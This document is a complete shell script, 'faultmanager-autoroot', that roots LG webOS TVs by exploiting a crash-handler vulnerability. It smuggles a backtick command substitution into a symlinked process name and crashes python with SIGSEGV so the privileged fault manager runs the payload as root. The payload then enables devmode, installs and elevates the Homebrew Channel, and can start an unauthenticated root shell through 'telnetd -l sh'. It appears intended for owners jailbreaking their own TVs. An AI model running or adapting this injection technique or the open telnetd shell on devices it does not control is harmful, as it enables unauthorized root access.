#!/bin/sh

# faultmanager-autoroot
# by throwaway96
# https://github.com/throwaway96/faultmanager-autoroot
# Copyright 2024-2025. Licensed under AGPL v3 or later. No warranties.

# Thanks to:
# - buglloc (Andrew Krasichkov) for discovering the vulnerability
#   (https://ut.buglloc.com/webos-jailbreak/)

set -e

SCRIPT_DIR="${SCRIPT_DIR:-$(dirname -- "${0}")}"
DEBUG="${DEBUG:-}"
IPK_SRC="${IPK_SRC:-"${SCRIPT_DIR}/hbchannel.ipk"}"
IPK_URL='https://github.com/webosbrew/webos-homebrew-channel/releases/download/v0.7.2/org.webosbrew.hbchannel_0.7.2_all.ipk'
SCRIPT_NAME='faultmanager-autoroot'

PAYLOAD_LOGNAME='payload_log'
PAYLOAD_IPKNAME='hbchannel.ipk'

# Description: Checks if the current user has root privileges
# 1. Uses id -u to get the user ID
# 2. Compares the user ID to 0
# 3. Returns 0 if the user is root, 1 otherwise
is_root() {
    test "$(id -u)" -eq 0
}

# AppID for toasts/alerts   
SRC_APPID='com.webos.service.secondscreen.gateway'

# Description: Sends a toast notification with the specified message
# 1. Checks if logfile is set and logs a debug message
# 2. Constructs the payload for the toast notification
# 3. Sends the toast notification using luna-send or luna-send-pub
# 4. If the user is root, uses luna-send to send the toast
toast() {
    [ -n "${logfile}" ] && debug "toasting: '${1}'"

    title="${SCRIPT_NAME}"
    escape1="${1//\\/\\\\}"
    escape="${escape1//\"/\\\"}"
    payload="$(printf '{"sourceId":"%s","message":"<h3>%s</h3>%s"}' "${SRC_APPID}" "${title}" "${escape}")"

    if is_root; then
        luna-send -w 1000 -n 1 -a "${SRC_APPID}" 'luna://com.webos.notification/createToast' "${payload}" >/dev/null
    else
        luna-send-pub -w 1000 -n 1 -q 'sdkVersion' -f 'luna://com.webos.service.tv.systemproperty/getSystemInfo' '{"keys":["sdkVersion"]}' | sed -n -e 's/^\s*"sdkVersion":\s*"\([0-9.]\+\)"\s*$/\1/p'
    fi
}

# Description: Logs debug messages if DEBUG is enabled
# 1. Checks if DEBUG is not empty
# 2. Constructs the debug message with the provided argument
# 3. Logs the debug message to the console and the logfile
# 4. Uses fsync to ensure the logfile is written
# 5. Returns immediately if DEBUG is empty
debug() {
    [ -z "${DEBUG}" ] && return

    msg="[d] ${1}"
    echo "${msg}"
    echo "${msg}" >>"${logfile}"
    fsync -- "${logfile}"
}

# Description: Logs general messages
# 1. Constructs the message with the provided argument
# 2. Logs the message to the console and the logfile
# 3. Uses fsync to ensure the logfile is written
log() {
    msg="[ ] ${1}"
    echo "${msg}"
    echo "${msg}" >>"${logfile}"
    fsync -- "${logfile}"
}

# Description: Logs error messages and displays a toast notification
# 1. Constructs the message with the provided argument
# 2. Logs the message to the console and the logfile
# 3. Uses fsync to ensure the logfile is written
# 4. Displays a toast notification with the error message
error() {
    msg="[!] ${1}"
    echo "${msg}"
    echo "${msg}" >>"${logfile}"
    fsync -- "${logfile}"
    toast "<b>Error:</b> ${1}"
}

# Description: Retrieves the SDK version
# 1. Sends a luna-send-pub request to get the SDK version
# 2. Parses the response to extract the SDK version
# 3. Returns the SDK version
get_sdkversion() {
    luna-send-pub -w 1000 -n 1 -q 'sdkVersion' -f 'luna://com.webos.service.tv.systemproperty/getSystemInfo' '{"keys":["sdkVersion"]}' | sed -n -e 's/^\s*"sdkVersion":\s*"\([0-9.]\+\)"\s*$/\1/p'
}

# Description: Retrieves the Dev Mode app state
# 1. Sends a luna-send request to get the Dev Mode app state
# 2. Parses the response to extract the app state
# 3. Returns the app state
get_devmode_app_state() {
    # root required
    luna-send -w 5000 -n 1 -q 'returnValue' -f 'luna://com.webos.applicationManager/getAppInfo' '{"id":"com.palmdts.devmode"}' | sed -n -e 's/^\s*"returnValue":\s*\(true\|false\)\s*,\?\s*$/\1/p'
}

exit_handler=''

# Description: Adds a command to the EXIT trap
# 1. Checks if exit_handler is already set
# 2. If it is, appends the new command to the existing handler
# 3. If it is not, sets the exit_handler to the new command
# 4. Sets the EXIT trap to the combined exit handler
add_exit_trap() {
    if [ -n "${exit_handler}" ]; then
        exit_handler="${1};${exit_handler}"
    else
        exit_handler="${1}"
    fi

    trap "${exit_handler}" 'EXIT'
}

# Description: Creates a lockfile to prevent multiple instances
# 1. Takes a lockfile path as an argument
# 2. Creates a lockfile using exec 200>"${lockfile}"
# 3. Uses flock to lock the file exclusively
# 4. If the file is already locked, returns an error and exits with status 2
# 5. Adds the cleanup command to the exit trap
create_lockfile() {
    lockfile="${1}"
    exec 200>"${lockfile}"

    flock -x -n -- 200 || { echo '[!] Another instance of this script is currently running'; exit 2; }

    add_exit_trap "rm -f -- '${lockfile}'"
}


# Description: Verifies if the devmode init script checks for signature verification
# 1. Checks if devmode init script exists in systemd or upstart paths
# 2. If script exists, checks if it contains signature verification code
# 3. Returns 0 if verification is required, 1 if not required
# 4. Logs appropriate debug messages about script status
# 5. Handles missing or invalid script files safely
# 6. fgrep -q -e 'openssl dgst' -- "${script}" checks for openssl signature verification
check_sd_verify() {
    script_systemd='/lib/systemd/system/scripts/devmode.sh'
    script_upstart='/etc/init/devmode.conf'

	if [ -e "${script_systemd}" ]; then
        script="${script_systemd}"
	elif [ -e "${script_upstart}" ]; then
        script="${script_upstart}"
    else
        log 'Missing both devmode init scripts; please report this!'
        # err on the safe side by assuming it will be verified
        return 0
    fi

    if [ ! -f "${script}" ]; then
        log 'Devmode init script is not a file; please report this!'
        return 0
    fi

    fgrep -q -e 'openssl dgst' -- "${script}"
}

# Description: Downloads a file from the specified URL
# 1. Takes a URL and a path as arguments
# 2. Checks if the target file already exists
# 3. Deletes the existing file if it does
# 4. Uses curl to download the file from the URL to the specified path
download_file() {
    dl_url="${1}"
    dl_path="${2}"

    if [ -e "${dl_path}" ]; then
        log "Download target '${dl_path}' already exists; deleting"
        rm -f -- "${dl_path}"
    fi

    curl -L -o "${dl_path}" -- "${dl_url}"
}

sd_script='/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/start-devmode.sh'
sd_sig='/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/start-devmode.sig'
sd_key='/usr/palm/services/com.palm.service.devmode/pub.pem'

# Description: Verifies the SD (start-devmode.sh) script's signature using openssl to ensure it hasn't been tampered with
# 1. Checks if the script file exists
# 2. If it doesn't exist, logs a debug message and returns 0
# 3. If it does exist, checks if the public key file exists
# 4. If the public key file doesn't exist, logs an error and returns 1
# 5. If the public key file exists, checks if the signature file exists
# 6. If the signature file doesn't exist, logs an error and returns 1
# 7. If the signature file exists, verifies the script's signature
# 8. Returns 0 if verification succeeds, 1 if verification fails
verify_sd() {
    # If it's not present, don't worry about it
    [ ! -f "${sd_script}" ] && return 0

    if [ ! -f "${sd_key}" ]; then
        log "Expected Dev Mode public key is not present; please report this!"
        # Verification will fail without the public key file
        return 1
    fi

    if [ ! -f "${sd_sig}" ]; then
        log 'start-devmode.sh verification failed: missing signature file'
        return 1
    fi

    verify="$(openssl dgst -sha512 -verify "${sd_key}" -signature "${sd_sig}" "${sd_script}")"

    case "${verify}" in
    'Verified OK')
        debug 'start-devmode.sh verification succeeded'
        return 0
    ;;
    'Verification Failure')
        log 'start-devmode.sh verification failed: signature mismatch'
        return 1
    ;;
    *)
        log "start-devmode.sh verification failed for unknown reason: '${verify}'"
        return 1
    ;;
    esac
}

# Description: Enables Dev Mode by creating the necessary directory
# 1. Checks if devmode_enabled directory exists
# 2. If it does, logs a warning that the TV is already rooted
# 3. If devmode_enabled is a file, removes it and logs a warning about the LG Dev Mode app
# 4. Creates the devmode_enabled directory
# 5. If directory creation fails, logs an error and exits with status 1
enable_devmode() {
    if [ -d '/var/luna/preferences/devmode_enabled' ]; then
        log 'devmode_enabled is already a directory; is your TV already rooted?'
    else
        if [ -e '/var/luna/preferences/devmode_enabled' ]; then
            log 'devmode_enabled exists; make sure the LG Dev Mode app is not installed!'

            rm -f -- '/var/luna/preferences/devmode_enabled'
        else
            debug 'devmode_enabled does not exist'
        fi

        if ! mkdir -- '/var/luna/preferences/devmode_enabled'; then
            error 'Failed to create devmode_enabled directory'
            exit 1
        fi
    fi
}

# Description: Restarts the appinstalld service
# 1. Restarts the appinstalld service
# 2. If successful, logs a debug message
# 3. If unsuccessful, logs an error message
restart_appinstalld() {
    if restart appinstalld >/dev/null; then
        debug 'appinstalld restarted'
    else
        log 'Failed to restart appinstalld'
    fi
}

# Description: Installs the specified IPK package
# 1. Checks if the IPK file exists
# 2. If not, logs an error and exits with status 1
# 3. Constructs the installation payload
# 4. Creates a FIFO file for communication with luna-send
# 5. Logs the installation process
# 6. Starts luna-send in the background to install the IPK
# 7. Waits for the installation result from the FIFO file
# 8. If the result contains 'installed', logs a success message
# 9. If the result contains 'failed' or 'Unknown method', logs an error and exits with status 1
# 10. If the result is not recognized, logs an error and exits with status 1

install_ipk() {
    ipkpath="${1}"

    if  [ ! -f "${ipkpath}" ]; then
        error 'IPK not found during installation'
        exit 1
    fi

    instpayload="$(printf '{"id":"com.ares.defaultName","ipkUrl":"%s","subscribe":true}' "${ipkpath}")"

    fifopath="${tempdir}/fifo"

    mkfifo -- "${fifopath}"

    log "Installing ${ipkpath}..."
    toast 'Installing...'

    luna-send -w 20000 -i 'luna://com.webos.appInstallService/dev/install' "${instpayload}" >"${fifopath}" &
    luna_pid="${!}"

    if ! result="$(fgrep -m 1 -e 'installed' -e 'failed' -e 'Unknown method' -- "${fifopath}")"; then
        rm -f -- "${fifopath}"
        error 'Install timed out'
        exit 1
    fi

    kill -TERM "${luna_pid}" 2>/dev/null || true
    rm -f -- "${fifopath}"

    case "${result}" in
        *installed*) ;;
        *"Unknown method"*)
            error 'Installation failed (devmode_enabled not recognized)'
            debug "/dev/install response: '${result}'"
            return 1
        ;;
        *failed*)
            error 'Installation failed'
            log "/dev/install response: '${result}'"
            exit 1
        ;;
        *)
            error 'Installation failed for unknown reason'
            log "/dev/install response: '${result}'"
            exit 1
        ;;
    esac

    return 0
}

# Description: Elevates the Homebrew Channel service
# 1. Checks if the elevate-service script succeeds
# 2. If it fails, logs an error and exits with status 1
# 3. If it succeeds, logs a debug message
elevate_hbchannel() {
    if ! /media/developer/apps/usr/palm/services/org.webosbrew.hbchannel.service/elevate-service >"${tempdir}/elevate.log"; then
        error 'Elevation failed'
        exit 1
    fi
}

# Description: Sets up persistent root access by following these steps:
# 1. Enables developer mode by calling enable_devmode function
# 2. Restarts the app installer service via restart_appinstalld
# 3. Tries to install the Homebrew Channel IPK file with retries:
#    - Makes 3 attempts with increasing sleep delays between retries
#    - If installation succeeds, continues to next step
#    - If all retries fail, exits with error
# 4. Elevates the Homebrew Channel service privileges using elevate_hbchannel
# 5. Checks if start-devmode.sh exists and needs signature verification:
#    - If verification is required, validates the script signature
#    - If signature is invalid, renames script to prevent /media/developer wipe
#    - Unless --leave-script option is set, then keeps invalid script
#    - Warns user if script rename fails as root access will be lost on reboot
# 6. Checks Dev Mode app installation status:
#    - Verifies if Dev Mode app is installed using get_devmode_app_state
#    - Shows appropriate alert/toast messages based on installation status
#    - Warns user to uninstall Dev Mode app if installed
#    - Provides reboot option if Dev Mode app is not installed
#    - Shows warning if Dev Mode app status cannot be determined
# 7. Displays a final toast notification with rooting completion message
perform_root() {
    enable_devmode

    restart_appinstalld

    sleep_secs_base=2
    retries=3

    for retry in $(seq "${retries}" -1 0); do
        if install_ipk "${ipk}"; then
            # success
            break
        fi

        if [ "${retry}" -eq 0 ]; then
            error 'Retries exhausted: giving up'
            exit 1
        fi

        sleep_secs=$((sleep_secs_base * (retries - retry + 1)))

        restart_appinstalld

        log "Sleeping for ${sleep_secs} seconds before trying again (${retry} tries remaining)"
        sleep "${sleep_secs}"
    done

    elevate_hbchannel

    log 'Homebrew Channel has been elevated'

    if [ -f "${sd_script}" ]; then
        if check_sd_verify; then
            log 'Current firmware verifies start-devmode.sh signature'

            if verify_sd; then
                log 'Your start-devmode.sh passes verification. If the Dev Mode app is installed, uninstall it!'
            elif [ -n "${LEAVE_SCRIPT}" ]; then
                # Invalid start-devmode.sh but --leave-script set
                debug 'Not renaming invalid start-devmode.sh due to option'
            else
                # Invalid start-devmode.sh and --leave-script not set
                if mv -- "${sd_script}" "${sd_script}.backup"; then
                    log 'Your start-devmode.sh failed verification and was renamed to prevent /media/developer from being wiped'
                    toast '<b>Warning:</b> Renamed start-devmode.sh to prevent deletion of apps'
                else
                    error 'Failed to rename bad start-devmode.sh. You will lose root on reboot!'
                fi
            fi
        else
            log 'Current firmware does not verify start-devmode.sh signature, but an updated version might'

            if [ ! -f "${sd_sig}" ]; then
                log 'You are missing start-devmode.sig, so verification would fail. Be careful updating your firmware!'
            fi
        fi
    else
        debug 'start-devmode.sh does not exist; skipping checks'
    fi

    devmode_installed="$(get_devmode_app_state)"

    debug "Dev Mode app installed: '${devmode_installed}'"

    buttons_reboot='{"label":"Reboot now","onclick":"luna://com.webos.service.sleep/shutdown/machineReboot","params":{"reason":"remoteKey"}},{"label":"Don'\''t reboot"}'
    buttons_ok='{"label":"OK"}'

    message_reboot='Would you like to reboot now?'
    message_devmode='However, the Dev Mode app is installed. You must uninstall it before rebooting!'
    message_devmode_unknown='The status of the Dev Mode app could not be determined. Please report this issue. If you know it is not installed, you can reboot now. Otherwise, make sure it is removed before rebooting.<br>Would you like to reboot now?'

    case "${devmode_installed}" in
        false)
            log "Dev Mode app not installed. (Don't install it!)"
            buttons="${buttons_reboot}"
            message="${message_reboot}"
        ;;
        true)
            log 'Dev Mode app installed; uninstall it before rebooting!'
            buttons="${buttons_ok}"
            message="${message_devmode}"
        ;;
        *)
            log "Unknown Dev Mode app state: '${devmode_installed}' (please report)"
            buttons="${buttons_reboot}"
            message="${message_devmode_unknown}"
        ;;
    esac

    payload="$(printf '{"sourceId":"%s","message":"<h3>%s</h3>Rooting complete. You may need to reboot for Homebrew Channel to appear.<br>%s","buttons":[%s]}' "${SRC_APPID}" "${SCRIPT_NAME}" "${message}" "${buttons}")"

    alert_response="$(luna-send -w 2000 -a "${SRC_APPID}" -n 1 'luna://com.webos.notification/createAlert' "${payload}")"

    debug "/createAlert response: '${alert_response}'"

    log 'Rooting complete'
    toast 'Rooting complete. <h4>Do not install the LG Dev Mode app while rooted!</h4>'
}

# Description: Generates a random 4-character string
# 1. Uses mktemp to create a temporary file with a unique name
# 2. Extracts the last 4 characters from the unique name
# 3. Returns the extracted 4 characters as the random string
gen_random4() {
    # Older BusyBox mktemp will prefix bare XXXXXX with "file"
    randstr="$(mktemp -u -- '_XXXXXX')"
    echo "${randstr:1:4}"
}

# Description: Finds the available Python interpreter
# 1. Sets up paths for python2 and python3
# 2. Checks if python3 is available and returns its path
# 3. If python3 is not available, checks for python2 and returns its path
# 4. If neither is available, logs an error and exits with status 1
# 5. Returns the path to the first available Python interpreter
find_python() {
    python2_path='/usr/bin/python'
    python3_path='/usr/bin/python3'

    if [ -e "${python3_path}" ]; then
        echo "${python3_path}"
    elif [ -e "${python2_path}" ]; then
        echo "${python2_path}"
    else
        error "Python not found"
        exit 1
    fi
}

# Description: Main payload function that performs rooting operations
# 1. Checks if script already ran in this tempdir by checking payload.once file
# 2. Shows toast notification if DEBUG mode is enabled
# 3. Starts telnet daemon if TELNET flag is set
# 4. Logs the script path
# 5. Checks and warns if not running as root
# 6. Verifies IPK file exists in tempdir
# 7. Logs current date and user ID
# 8. Calls perform_root() to do the actual rooting
# 9. Signals parent process with USR1 if parent_pid is set
payload() {
    if [ -n "${tempdir}" ]; then
        logfile="${tempdir}/${PAYLOAD_LOGNAME}"
    else
        tempdir="/tmp/autoroot.${$}"
        if ! mkdir -- "${tempdir}"; then
            echo "[x] PID-based fallback temporary directory ${tempdir} already exists"
            tempdir='/tmp/autoroot.temp'
            rm -rf -- "${tempdir}"
            mkdir -- "${tempdir}"
        fi

        logfile="${tempdir}/error_log"

        error "Payload didn't receive tempdir; see ${logfile}"
    fi

    # Ensures the script runs only once per tempdir
    payload_oncefile="${tempdir}/payload.once"
    [ -e "${payload_oncefile}" ] && { debug 'Script already executed'; exit 3; }
    touch -- "${payload_oncefile}"

    [ -n "${DEBUG}" ] && toast 'Script is running!'

    [ -n "${TELNET}" ] && { telnetd -l sh || echo "[!] Failed to start telnetd (${?})"; }

    log "script path: ${0}"

    if ! is_root; then
        log "warning: not running as root!"
    fi

    ipk="${tempdir}/${PAYLOAD_IPKNAME}"

    if [ ! -e "${ipk}" ]; then
        error "IPK does not exist ('${ipk}')"
    fi

    log "date: $(date -u -- '+%Y-%m-%d %H:%M:%S UTC')"
    log "id: $(id)"

    perform_root

    if [ -n "${parent_pid}" ]; then
        kill -USR1 "${parent_pid}"
    else
        error 'parent_pid not set'
    fi
}

umask 022

while [ "${#}" -gt 0 ]; do
    case "${1}" in
        '-d'|'--debug')
            DEBUG='arg'
        ;;
        '-t'|'--telnet')
            TELNET='arg'
        ;;
        '--leave-script')
            LEAVE_SCRIPT='arg'
        ;;
        '--payload')
            PAYLOAD='arg'
            tempdir="${2}"
            parent_pid="${3}"
            shift 2
        ;;
        *)
            echo "Unknown option '${1}'"
            exit 1
        ;;
    esac

    shift
done

if [ -n "${PAYLOAD}" ]; then
    # Payload (root) mode
    create_lockfile '/tmp/autoroot-payload.lock'
    payload
    exit
fi

# Exploit (non-root) mode
create_lockfile '/tmp/autoroot.lock'

if ! tempdir="$(mktemp -d -- '/tmp/autoroot.XXXXXX')"; then
    echo '[x] Failed to create random temporary directory; using PID-based fallback'
    tempdir="/tmp/autoroot.${$}"
    if ! mkdir -- "${tempdir}"; then
        echo "[x] PID-based fallback temporary directory ${tempdir} already exists"
        tempdir='/tmp/autoroot.temp'
        rm -rf -- "${tempdir}"
        mkdir -- "${tempdir}"
    fi
fi

logfile="${tempdir}/log"
touch -- "${logfile}"

if [ -n "${DEBUG}" ]; then
    loglink='/tmp/autoroot-link.log'
    rm -rf -- "${loglink}"
    ln -s -- "${logfile}" "${loglink}"
fi

log 'hi'

log "script path: ${0}"

debug "temp dir: ${tempdir}"

log "date: $(date -u -- '+%Y-%m-%d %H:%M:%S UTC')"
log "id: $(id)"

add_exit_trap "cp -f -- '${logfile}' '${SCRIPT_DIR}/autoroot.log'"

webos_version="$(get_sdkversion)"

log "webOS version: ${webos_version}"

payload_ipk="${tempdir}/${PAYLOAD_IPKNAME}"

if [ -f "${IPK_SRC}" ]; then
    debug "Using bundled Homebrew Channel IPK"
    cp -- "${IPK_SRC}" "${payload_ipk}"
else
    log "Homebrew Channel IPK not found at '${IPK_SRC}'; downloading..."
    if ! download_file "${IPK_URL}" "${payload_ipk}"; then
        error "Failed to download Homebrew Channel IPK from ${IPK_URL}"
        exit 1
    fi
fi

if [ -z "${XDG_DIR}" ]; then
    log "warning: XDG_DIR is not set; trying '/tmp/xdg'"
    # Hope that it's set in the target daemon's environment
    XDG_DIR='/tmp/xdg'
elif [ "${XDG_DIR}" != '/tmp/xdg' ]; then
    # This could be bad
    log "warning: XDG_DIR is '${XDG_DIR}' (rather than '/tmp/xdg')"
fi

payload_uninterp="\$XDG_DIR-$(gen_random4)"

if [ "${#payload_uninterp}" -gt 15 ]; then
    log "warning: path is too long (${#payload_uninterp} > 15)"
fi

payload_script="$(eval 'echo' "${payload_uninterp}")"

debug "payload_script: '${payload_script}'"

payload_logfile="${tempdir}/${PAYLOAD_LOGNAME}"
touch -- "${payload_logfile}"
chmod '0622' -- "${payload_logfile}"

add_exit_trap "cp -f -- '${payload_logfile}' '${SCRIPT_DIR}/autoroot-payload.log'"

temp_script_copy="${tempdir}/autoroot.sh"
rm -f -- "${temp_script_copy}"
cp -- "${0}" "${temp_script_copy}"

# Forward our command line options
payload_args=''
[ -n "${DEBUG}" ] && payload_args="${payload_args} -d"
[ -n "${TELNET}" ] && payload_args="${payload_args} -t"
[ -n "${LEAVE_SCRIPT}" ] && payload_args="${payload_args} --leave-script"

cat >"${payload_script}" <<__EOF__
#!/bin/sh
sh "${temp_script_copy}" --payload "${tempdir}" "${$}" ${payload_args}
__EOF__

chmod '0755' -- "${payload_script}"

# Create a link to python so that when it crashes, it will have the comm we want
crash="${tempdir}/\`${payload_uninterp}\`"
ln -s -- "$(find_python)" "${crash}"

killed_tail=''

# Description:Kill the background child process if it's still running
# 1. Checks if killed_tail is already set
# 2. If it is, returns without doing anything
# 3. If it is not, checks if there are any background jobs
# 4. If there are, kills the child process and sets killed_tail to 'yes'
# 5. If there are no background jobs, logs that the child process is already dead
kill_tail() {
    if [ -n "${killed_tail}" ]; then
        # This must be the EXIT handler after the SIGUSR1 handler already ran
        return
    fi

    if jobs %% >/dev/null 2>&1; then
        debug 'Killing child process'
        kill %%
        killed_tail='yes'
    else
        debug 'Child process already dead'
    fi
}

# Description: SIGUSR1 handler
# 1. Waits for tail to finish reading log
# 2. Calls kill_tail to stop the background child process
# 3. Logs that the payload is complete
# 4. Exits with status 0
sigusr1_handler() {
    # Wait for tail to finish reading log
    sleep 2

    kill_tail

    log 'Payload complete'

    exit 0
}

trap 'sigusr1_handler' 'USR1'

# Kill child process regardless of exit type (although not SIGINT...)
add_exit_trap 'kill_tail'

# Crash with one of the signals handled by libSegFault
"${crash}" -c 'import os;os.kill(os.getpid(),11)' || true

# Display output from payload
echo "Payload log:"
tail -f -- "${payload_logfile}" &

# Wait for SIGUSR1 from payload
wait_ret=''
wait %% || wait_ret="${?}"

# If we received SIGUSR1, the handler will have prevented us from getting here
error "Error reading payload log (${wait_ret:-not set})"
exit 1
